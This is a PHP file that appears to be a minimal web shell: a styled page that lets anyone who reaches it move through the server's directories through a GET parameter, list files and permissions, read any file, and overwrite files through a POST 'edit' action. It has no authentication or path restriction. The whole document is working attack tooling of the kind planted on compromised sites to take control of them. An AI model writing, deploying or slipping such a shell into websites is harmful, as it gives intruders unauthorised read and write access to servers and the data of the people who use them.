<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
	body {
		background: #171717;
		color: #d4d4d4;
		font-family: 'Pangolin', cursive;
	}
	a {
		font-family: 'Pangolin', cursive;
		text-decoration: none;
		color: #d4d4d4;
	}
	table {
		border-radius:10px;
		padding: 20px;
		width:70%;
		background: #242424;
	}
	textarea {
		width:100%;
		font-family: 'Pangolin', cursive;
		height:350px;
		border-radius:7px;
		color: #d4d4d4;
		resize: none;
		outline: none;
		padding:15px;
		border:2px solid #d4d4d4;
		background: transparent;
	}
	::-webkit-scrollbar {
    	width: 0px;
    	background: transparent;
	}
	::-webkit-scrollbar-thumb {
    	background: #FF0000;
	}
	input[type=submit] {
		padding:5px;
		font-family: 'Pangolin', cursive;
		border-radius:7px;
		background: none;
		border:2px solid #d4d4d4;
		color: #d4d4d4;
		outline: none;
		width:100%;
	}
	td {
		border:1px solid #d4d4d4;
		padding:3px;
	}
	td.files {
		max-width:70%;
	}
	td.form {
		width:10px;
	}
	td.action {
		width:100px;
	}
	td.tt {
		width:1px;
	}
	td.header {
		padding:5px;
		text-align: center;
		font-size:25px;
		font-weight: bold;
	}
	td.select {
		width:100px;
	}
</style>
<table align="center">
<?php
class x {
	public function __construct(bool $debug = true, int $time = 0) {
        if ($debug === true) {
            error_reporting(E_ALL);
        } else {
            error_reporting($debug);
        }

        error_log($debug);
        set_time_limit($time);
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->cwd 	= $this->cwd();
        $this->cft 	= time();
    }
    public function cwd() {
    	return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
    }
    public function cd(string $directory) {
    	return chdir($directory);
    }
    public function changeTime($filename) {
        if (file_exists($filename)) $this->cft = filemtime($filename);
    }
    public function perms($filename) {
    	return substr(sprintf("%o", fileperms($filename)), -4);
    }
    public function w__($filename, $perms) {
    	if (is_writable($filename)) {
    		return "<font color='green'>{$perms}</font>";
    	} else {
    		return "<font color='red'>{$perms}</font>";
    	}
    }
    public function size($filename) {
    	if (is_file($filename)) {
    		$this->filepath = $filename;
    		if (!realpath($this->filepath)) {
    			$this->filepath = $this->root . $this->filepath;
    		}
    		$this->filesize = filesize($this->filepath);
    		$this->size 	= array("TB","GB","MB","KB","B");
    		$this->total 	= count($this->size);
    		while ($this->total-- && $this->filesize > 1024) {
    			$this->filesize /= 1024;
    		} return round($this->filesize, 2) . " " . $this->size[$this->total];
    	} return false;
    }
    public function ftime($filename) {
    	return date("F d Y g:i:s", filemtime($filename));
    }
    public function save($filename, $text, $mode = "w") {
    	if (substr($this->cwd, -1) === DIRECTORY_SEPARATOR) {
    		$this->changeTime($this->cwd . $filename);
    		$this->handle = fopen($filename, $mode);
    		fwrite($this->handle, $text);
    		fclose($this->handle);
    	} else {
    		$this->changeTime($this->cwd . DIRECTORY_SEPARATOR . $filename);
    		$this->handle = fopen($filename, $mode);
    		fwrite($this->handle, $text);
    		fclose($this->handle);
    	}
    }
}

$x = new x();

if (isset($_GET['cd'])) {
	$x->cd($_GET['cd']);
}
switch (@$_POST['act']) {
	case 'edit':
		if (isset($_POST['submit'])) {
			if ($x->save($_POST['file'], $_POST['text'])) {
				echo "failed";
			} else {
				echo "success";
			}
		}
		?>
		<tr>
			<td class="action">
				<a href="?cd=<?= getcwd() ?>">BACK</a>
			</td>
			<td colspan="2" class="header">
				EDIT
			</td>
		</tr>
		<tr>
			<td class="action">
				Filename
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= basename($_POST['file']) ?>
			</td>
		</tr>
		<tr>
			<td class="action">
				Size
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= $x->size($_POST['file']) ?>
			</td>
		</tr>
		<tr>
			<td class="action">
				Last update
			</td>
			<td class="tt"><center>:</center></td>
			<td>
				<?= $x->ftime($_POST['file']) ?>
			</td>
		</tr>
		<form method="post">
			<tr>
				<td colspan="3">
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
			</tr>
			<tr>
				<td colspan="3">
					<input type="submit" name="submit">
					<input type="hidden" name="act" value="edit">
					<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
				</td>
			</tr>
		</form>
		<?php
		exit();
		break;
}

foreach (scandir(getcwd()) as $key => $value) {
	if (!is_dir($value) || $value === '.') continue;
		if ($value === '..') {
			?>
			<tr>
				<td colspan="5">
					<a href="?cd=<?= dirname(getcwd()) ?>">BACK</a>
				</td>
			</tr>
			<?php
		} else {
			?>
			<tr>
				<td class="form">
					<input type="checkbox" name="value[]" form="myform">
				</td>
				<td class="files">
					<a href="?cd=<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>"><?= $value ?></a>
				</td>
				<td>
					<center>
						<?= @filetype($value) ?>
					</center>
				</td>
				<td>
					<center>
						<?= $x->w__($value, $x->perms($value)) ?>
					</center>
				</td>
				<form method="post">
					<td class="select">
						<select name="act" onchange="if(this.value != '0') this.form.submit()">
							<option selected>ACTION</option>
						</select>
						<input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
					</td>
				</form>
			</tr>
			<?php
		}
}
foreach (scandir(getcwd()) as $key => $value) {
	if (!is_file($value)) continue;
		?>
		<tr>
			<td class="form">
				<input type="checkbox" name="value[]" form="myform">
			</td>
			<td class="files">
				<?= $value ?>
			</td>
			<td>
				<center>
					<?= $x->size($value) ?>
				</center>
			</td>
			<td>
				<center>
					<?= $x->w__($value, $x->perms($value)) ?>
				</center>
			</td>
			<form method="post">
				<td class="select">
					<select name="act" onchange="if(this.value != '0') this.form.submit()" >
						<option selected>ACTION</option>
						<option value="edit">EDIT</option>
					</select>
					<input type="hidden" name="file" value="<?= getcwd() . DIRECTORY_SEPARATOR . $value ?>">
				</td>
			</form>
		</tr>
		<?php
}
?>
<tr>
	<td>
		<input type="checkbox">
	</td>
	<td colspan="4">
		<select>
			<option selected>ACTION</option>
		</select>
	</td>
</tr>
</table>
